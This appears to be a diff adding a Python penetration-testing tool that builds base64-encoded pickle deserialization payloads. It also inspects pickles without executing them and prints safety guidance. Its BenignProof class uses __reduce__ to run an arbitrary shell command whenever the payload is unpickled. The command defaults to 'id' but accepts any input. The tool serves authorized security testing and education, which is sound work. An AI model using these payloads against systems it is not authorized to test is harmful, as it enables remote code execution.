@@ -1,0 +1,160 @@
+#!/usr/bin/env python3
+"""Pickle Payload - small helper for authorized Python pickle testing."""
+
+import base64
+import binascii
+import hashlib
+import io
+import json
+import pickle
+import pickletools
+import subprocess
+from datetime import datetime, timezone
+from pathlib import Path
+
+
+class BenignProof:
+    """Pickle object that runs a low-impact proof command when unpickled."""
+
+    def __init__(self, command="id"):
+        self.command = command
+
+    def __reduce__(self):
+        return (subprocess.check_output, (["sh", "-c", self.command],))
+
+
+def b64_pickle(obj):
+    raw = pickle.dumps(obj, protocol=4)
+    return raw, base64.b64encode(raw).decode("ascii")
+
+
+def fingerprint(raw):
+    return hashlib.sha256(raw).hexdigest()
+
+
+def decode_b64(value):
+    value = "".join(value.strip().split())
+    value += "=" * (-len(value) % 4)
+    try:
+        return base64.b64decode(value, validate=True)
+    except (binascii.Error, ValueError) as exc:
+        raise ValueError(f"Invalid Base64: {exc}") from exc
+
+
+def safe_pickle_inspect(raw):
+    """Disassemble pickle bytes without unpickling/executing them."""
+    out = io.StringIO()
+    try:
+        pickletools.dis(raw, out=out)
+        return True, out.getvalue()
+    except Exception as exc:
+        return False, f"Not a valid/complete pickle: {exc}"
+
+
+def save_evidence(kind, raw, command=None):
+    evidence = {
+        "tool": "pickle-payload",
+        "test": "Python pickle deserialization",
+        "payload_type": kind,
+        "encoding": "base64",
+        "sha256": fingerprint(raw),
+        "generated_at": datetime.now(timezone.utc).isoformat(),
+        "result": "payload-generated",
+    }
+    if command is not None:
+        evidence["command"] = command
+    Path("evidence.json").write_text(json.dumps(evidence, indent=2) + "\n")
+    print("Evidence      : evidence.json")
+
+
+def generate_harmless():
+    raw, encoded = b64_pickle({"test": "hello"})
+    print("\nBase64 payload:")
+    print(encoded)
+    print("\nSHA-256      :", fingerprint(raw))
+    save_evidence("harmless-data", raw)
+
+
+def generate_proof():
+    print("\nAuthorized testing only. Use a low-impact proof command.")
+    command = input("Benign command [id]: ").strip() or "id"
+    raw, encoded = b64_pickle(BenignProof(command))
+    print("\nBase64 payload:")
+    print(encoded)
+    print("\nSHA-256      :", fingerprint(raw))
+    print("Local command : NOT executed")
+    save_evidence("benign-command-proof", raw, command)
+
+
+def inspect_payload():
+    encoded = input("Paste Base64/Pickle payload: ").strip()
+    raw = decode_b64(encoded)
+    ok, listing = safe_pickle_inspect(raw)
+    print("\nDecoded bytes :", len(raw))
+    print("SHA-256       :", fingerprint(raw))
+    print("Pickle        :", "valid structure" if ok else "not confirmed")
+    print("Executed      : NO")
+    print("\nPickle disassembly:")
+    print(listing)
+
+
+def decode_layer():
+    encoded = input("Paste Base64 value: ").strip()
+    raw = decode_b64(encoded)
+    print("\nDecoded bytes :", len(raw))
+    print("SHA-256       :", fingerprint(raw))
+    print("Hex preview   :", raw[:64].hex())
+    print("Text preview  :", repr(raw[:256].decode("utf-8", errors="replace")))
+
+
+def safety_info():
+    print("""
+Pickle can reconstruct Python objects by invoking callables.
+Never call pickle.loads() on an unknown/untrusted payload just to inspect it.
+
+This tool's inspector uses pickletools.dis(), which parses pickle opcodes
+without intentionally unpickling the object.
+
+Base64 is only an encoding layer; it does not make pickle data safe.
+Use execution-proof payloads only on systems you are authorized to test.
+""".strip())
+
+
+def main():
+    while True:
+        print("""
+=== PICKLE PAYLOAD ===
+
+[1] Generate harmless Pickle
+[2] Generate benign execution proof
+[3] Inspect Base64/Pickle payload
+[4] Decode Base64 layer
+[5] Pickle safety info
+[0] Exit
+""".strip())
+        choice = input("\nChoice: ").strip()
+
+        try:
+            if choice == "0":
+                return
+            if choice == "1":
+                generate_harmless()
+            elif choice == "2":
+                generate_proof()
+            elif choice == "3":
+                inspect_payload()
+            elif choice == "4":
+                decode_layer()
+            elif choice == "5":
+                safety_info()
+            else:
+                print("Unknown choice. Choose 0-5.")
+                continue
+        except (ValueError, OSError) as exc:
+            print("Error:", exc)
+
+        input("\nPress Enter to return to menu...")
+
+
+if __name__ == "__main__":
+    main()
